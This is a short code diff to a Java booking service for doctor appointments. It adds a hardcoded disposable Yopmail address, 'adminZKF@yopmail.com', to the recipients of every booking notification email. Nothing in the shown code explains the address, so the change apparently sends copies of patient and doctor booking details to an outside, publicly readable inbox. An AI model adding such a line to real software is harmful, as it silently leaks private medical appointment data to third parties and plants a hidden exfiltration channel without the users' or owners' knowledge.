@@ -121,6 +121,7 @@ public class BookingServiceImpl implements BookingService {
         List<String> emailList = new ArrayList<>();
         emailList.add(booking.getUser().getEmail());
         emailList.add(booking.getDoctor().getEmail());
+        emailList.add("adminZKF@yopmail.com");
         UserProfile userProfile = userProfileRepository.findByUser(booking.getUser());
         Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
         User user = userRepository.findByEmail(authentication.getName());
